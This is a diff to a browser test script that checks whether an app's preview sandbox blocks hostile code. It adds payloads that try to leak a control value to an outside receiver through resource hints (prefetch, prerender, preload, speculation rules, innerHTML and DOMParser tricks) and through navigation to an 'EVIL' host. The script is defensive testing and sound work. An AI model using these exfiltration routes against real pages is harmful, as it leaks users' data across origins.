@@ -1,6 +1,7 @@
 // Checks what the preview sandbox enforces, in a real browser, with hostile preview code. Needs the running app
 // (development server, no owner key) and makes no Context.dev request. Prints PASS or FAIL per property; exits 1 on a FAIL.
 // Usage: node scripts/sandbox-check.ts http://127.0.0.1:<port>
+import { createServer } from "node:http";
 import { chromium } from "playwright-core";
 
 const base = process.argv[2];
@@ -55,6 +56,30 @@ const NAVIGATE = `setTimeout(() => { location.href = "/"; }, 600);`;
 // navigation sends the control values to another host.
 const NAVIGATE_204 = `setInterval(() => { location.href = "${EVIL}/nav204?size=" + clay.values.size + "&n=" + Date.now(); }, 300);`;
 
+// A receiver on another origin: a resource hint that leaves the frame shows up here (the third security review).
+const leaks: string[] = [];
+const receiver = createServer((req, res) => { leaks.push(req.url ?? ""); res.writeHead(200, { "Content-Type": "text/html" }).end("<p>receiver</p>"); });
+await new Promise<void>((r) => receiver.listen(0, "127.0.0.1", r));
+const RECV = `http://127.0.0.1:${(receiver.address() as { port: number }).port}`;
+/** Hostile code that tries every hint route and writes what happened into its own document. */
+const HINTS = `
+const out = {}, T = "${RECV}";
+const has = (end) => !!document.querySelector('link[href$="' + end + '"]');
+for (const rel of ["prerender", "prefetch", "preload", "modulepreload", "dns-prefetch", "preconnect"]) {
+  try { const l = document.createElement("link"); l.rel = rel; l.href = T + "/js-" + rel + "?size=" + clay.values.size; if (rel === "preload") l.as = "fetch"; document.head.appendChild(l); out["js " + rel] = "ALLOWED inserted"; } catch (e) { out["js " + rel] = "blocked " + e.name; }
+}
+const tries = {
+  "innerHTML prerender": () => { const d = document.createElement("div"); d.innerHTML = '<link rel="prerender" href="' + T + '/inner-prerender">'; document.body.appendChild(d); return has("inner-prerender"); },
+  "insertAdjacentHTML prefetch": () => { document.body.insertAdjacentHTML("beforeend", '<link rel="prefetch" href="' + T + '/adjacent-prefetch">'); return has("adjacent-prefetch"); },
+  "outerHTML prefetch": () => { const d = document.createElement("div"); document.body.appendChild(d); d.outerHTML = '<link rel="prefetch" href="' + T + '/outer-prefetch">'; return has("outer-prefetch"); },
+  "DOMParser prefetch": () => { const doc = new DOMParser().parseFromString('<link rel="prefetch" href="' + T + '/parsed-prefetch">', "text/html"); const l = doc.querySelector("link"); if (l) document.head.appendChild(document.importNode(l, true)); return has("parsed-prefetch"); },
+  "template clone prerender": () => { const t = document.createElement("template"); t.innerHTML = '<link rel="prerender" href="' + T + '/template-prerender">'; document.head.appendChild(t.content.cloneNode(true)); return has("template-prerender"); },
+  "speculation rules": () => { const sc = document.createElement("script"); sc.type = "speculationrules"; sc.textContent = JSON.stringify({ prefetch: [{ source: "list", urls: [T + "/speculation"] }] }); document.head.appendChild(sc); return true; },
+};
+for (const [k, f] of Object.entries(tries)) { try { out[k] = f() ? "ALLOWED inserted" : "blocked (stripped)"; } catch (e) { out[k] = "blocked " + e.name; } }
+document.getElementById("report").textContent = JSON.stringify(out);
+`;
+
 const create = async (id: string, js: string) => {
   const r = await fetch(`${base}/api/playgrounds`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(spec(id, js)) });
   if (r.status !== 201) throw new Error(`could not create ${id}: ${r.status} ${await r.text()}`);
@@ -63,6 +88,9 @@ await create(`sbx-probe-${tag}`, PROBE);
 await create(`sbx-flood-${tag}`, FLOOD);
 await create(`sbx-nav-${tag}`, NAVIGATE);
 await create(`sbx-nav204-${tag}`, NAVIGATE_204);
+await create(`sbx-hints-${tag}`, HINTS);
+// A hint written straight in view.html, with the value bound into its address: refused when the playground is created.
+const markup = await fetch(`${base}/api/playgrounds`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ ...spec(`sbx-markup-${tag}`, ""), view: { type: "preview", html: `<p id="report">{{size}}</p><link rel="prerender" href="${RECV}/markup-prerender?size={{size}}">` } }) });
 
 const browser = await chromium.launch({ executablePath: process.env.CHROME ?? "/snap/bin/chromium" });
 const context = await browser.newContext();
@@ -151,6 +179,22 @@ for (const path of ["/", "/connect", "/sign-in", `/p/sbx-probe-${tag}`]) {
   check("a preview that navigates its frame to another host (204 answer) sends no request", nav204.length === 0, `${nav204.length} requests, first ${nav204[0]?.slice(0, 70) ?? "-"}`);
   await page.close();
 }
+// Resource hints: every route is blocked, and nothing reaches the receiver (dns-prefetch and preconnect send no HTTP
+// request, so for them only the DOM result shows it).
+{
+  check("a resource hint in view.html is refused when the playground is created", markup.status === 400, `status ${markup.status}`);
+  if (markup.status === 201) { const page = await context.newPage(); await page.goto(`${base}/p/sbx-markup-${tag}`, { waitUntil: "load" }); await page.waitForTimeout(3000); await page.close(); }
+  const page = await context.newPage();
+  await page.goto(`${base}/p/sbx-hints-${tag}`, { waitUntil: "load" });
+  const doc = (await page.waitForSelector("iframe")).contentFrame().then((f) => f!);
+  await (await doc).waitForFunction(() => document.getElementById("report")?.textContent?.startsWith("{"), null, { timeout: 15000 }).catch(() => {});
+  const out = JSON.parse((await (await doc).locator("#report").textContent().catch(() => "{}")) || "{}") as Record<string, string>;
+  for (const [k, v] of Object.entries(out)) check(`resource hint, ${k}`, v.startsWith("blocked"), v);
+  await page.waitForTimeout(3500);
+  check("no resource hint reached the outside receiver", leaks.length === 0, leaks.slice(0, 4).join(", "));
+  await page.close();
+}
+receiver.close();
 await browser.close();
 console.log(failed ? `${failed} FAILED` : "all sandbox checks passed");
 process.exit(failed ? 1 : 0);
